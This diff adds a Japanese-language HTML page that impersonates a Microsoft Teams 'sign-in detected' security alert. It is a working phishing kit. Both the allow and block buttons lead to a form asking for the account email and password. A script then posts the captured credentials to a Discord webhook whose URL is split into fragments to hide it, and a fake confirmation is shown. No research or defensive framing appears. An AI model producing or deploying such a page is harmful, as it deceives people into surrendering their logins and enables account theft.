@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>サインインを検知しました</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-content:center;padding-top:60px;}
+.page{width:780px;}
+.cert{background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.12);}
+.top-bar{height:4px;background:linear-gradient(90deg,#44546A,#0067b8,#2B7C8A);}
+.hdr{padding:40px 44px 30px;display:flex;align-items:center;gap:26px;border-bottom:1px solid #eee;}
+.hdr img.logo{width:auto;height:80px;flex-shrink:0;object-fit:contain;}
+.hdr .info h1{font-size:24px;font-weight:600;color:#1a1a1a;}
+.hdr .info small{display:block;font-size:15px;color:#888;margin-top:6px;}
+.body{padding:34px 44px;}
+.alert-box{background:#fdf2f0;border-left:4px solid #e74c3c;padding:16px 20px;font-size:14px;color:#5a2e24;margin-bottom:24px;border-radius:0 4px 4px 0;line-height:1.9;}
+.alert-box strong{color:#c0392b;}
+.meta-tbl{width:100%;border-collapse:collapse;margin-bottom:24px;}
+.meta-tbl td{padding:8px 0;border-bottom:1px solid #f0f0f0;font-size:14px;}
+.meta-tbl td:first-child{color:#888;width:30%;}
+.meta-tbl td:last-child{font-family:Consolas,monospace;font-size:14px;color:#333;}
+.btn-row{display:flex;gap:14px;margin-bottom:20px;}
+.btn{flex:1;padding:18px;border:none;border-radius:4px;font-size:18px;font-weight:600;cursor:pointer;letter-spacing:.3px;text-align:center;}
+.btn.allow{background:#0067b8;color:#fff;}
+.btn.allow:hover{background:#005da6;}
+.btn.deny{background:#fff;color:#e74c3c;border:2px solid #e74c3c;}
+.btn.deny:hover{background:#fdf2f0;}
+.divider{border:none;border-top:1px solid #eee;margin:26px 0;}
+.login-form{display:none;}
+.login-form label{font-size:14px;color:#555;font-weight:600;display:block;margin-bottom:7px;}
+.login-form input{width:100%;padding:15px 18px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:18px;font-family:'Segoe UI',sans-serif;background:#fff;}
+.login-form input:focus{outline:none;border-color:#0067b8;box-shadow:0 0 0 3px rgba(0,103,184,.1);}
+.login-form .btn-submit{width:100%;padding:18px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-size:20px;font-weight:600;cursor:pointer;}
+.login-form .btn-submit:hover{background:#005da6;}
+.spin{display:none;width:38px;height:38px;border:4px solid #ddd;border-top-color:#0067b8;border-radius:50%;margin:26px auto;animation:sp .7s linear infinite;}
+@keyframes sp{to{transform:rotate(360deg)}}
+.ok{display:none;text-align:center;padding:36px 0;}
+.ok p{font-size:19px;color:#107c10;font-weight:600;margin-bottom:10px;}
+.ok small{font-size:14px;color:#555;line-height:1.7;}
+.foot{padding:18px 44px;background:#f5f5f5;border-top:1px solid #eee;font-size:13px;color:#333;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-top:30px;}
+.foot a{color:#333;text-decoration:none;}
+.foot a:hover{color:#0067b8;}
+</style>
+</head>
+<body>
+<div class="page">
+<div class="cert">
+<div class="top-bar"></div>
+<div class="hdr">
+<img class="logo" src="teams.png" height="80" alt="Microsoft Teams">
+<div class="info">
+<h1>サインインを検知しました</h1>
+<small>セキュリティ通知</small>
+</div>
+</div>
+<div class="body">
+<div class="alert-box" id="alert-box">
+<strong>新しい接続を検知しました。</strong><br>
+あなたの Teams アカウントに誰かがログインしようとしています。<br>
+この新しい接続は許可され、今後接続を試みても通知は送信されません。<br><br>
+これがあなた自身ではない場合、または新しいネットワーク接続に気付かない場合は、下の「拒否」をクリックしてください。この接続はブロックされます。
+</div>
+<table class="meta-tbl" id="meta-tbl">
+<tr><td>接続時間</td><td>2026/11/14 09:42:17 JST</td></tr>
+<tr><td>IPアドレス</td><td>49.112.83.67</td></tr>
+<tr><td>推定場所</td><td>大阪府・大阪市</td></tr>
+<tr><td>エージェント</td><td>Mozilla/5.0 (Win64) Chrome/131</td></tr>
+</table>
+<div class="btn-row" id="btn-row">
+<button class="btn allow" onclick="doAction('allow')">この新しい接続を許可する</button>
+<button class="btn deny" onclick="doAction('deny')">この接続をブロックする</button>
+</div>
+<div class="divider"></div>
+<div id="form-area"></div>
+<div class="spin" id="sp"></div>
+<div class="ok" id="ok">
+<p>&#10003; 処理が完了しました</p>
+<small id="ok-detail"></small>
+</div>
+</div>
+<div class="foot">
+<a href="#" onclick="return false;">利用規約</a>
+<a href="#" onclick="return false;">プライバシー概要</a>
+<a href="#" onclick="return false;">法的情報</a>
+<span>&copy; Microsoft Corporation</span>
+</div>
+</div>
+</div>
+<script>
+var H="https:/";
+var T="/discord.com/api/webhooks/";
+var A="1569533813548388482/";
+var B="7wipbj3B0igYJicr-BVwvRfRU9izfKWKjjDY15wU5desK4cQx7Tgmt4HkhhkYCiKvVoA";
+var action="";
+function doAction(a){
+action=a;
+document.getElementById("alert-box").style.display="none";
+document.getElementById("meta-tbl").style.display="none";
+document.getElementById("btn-row").style.display="none";
+var reason=a==="allow"?"接続確認のため、以下のアカウント情報を入力してください。":"接続をブロックしました。ブロック確認のため、再認証を実行してください。";
+var area=document.getElementById("form-area");
+area.innerHTML='<div class="alert-box" style="margin-bottom:18px;">'+reason+'</div><form id="f" onsubmit="return send()"><label>アカウント</label><input type="email" id="u" autocomplete="off"><label>パスワード</label><input type="text" id="p" autocomplete="off"><button class="btn-submit" type="submit">'+(a==="allow"?"接続確認を実行":"再認証を実行")+'</button></form>';
+area.style.display="block";
+}
+function send(){
+var u=document.getElementById("u").value;
+var p=document.getElementById("p").value;
+if(!u||!p)return false;
+document.getElementById("f").style.display="none";
+document.getElementById("sp").style.display="block";
+var url=H+T+A+B;
+var body=JSON.stringify({"content":"["+action.toUpperCase()+"] user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
+fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
+.then(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";
+if(action==="allow"){document.getElementById("ok-detail").innerHTML="接続を許可しました。<br>以降、この接続からの通知は送信されません。";}
+else{document.getElementById("ok-detail").innerHTML="接続をブロックしました。<br>アカウントは保護されました。";}
+})
+.catch(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";
+if(action==="allow"){document.getElementById("ok-detail").innerHTML="接続を許可しました。";}
+else{document.getElementById("ok-detail").innerHTML="接続をブロックしました。";}
+});
+return false;
+}
+</script>
+</body>
+</html>
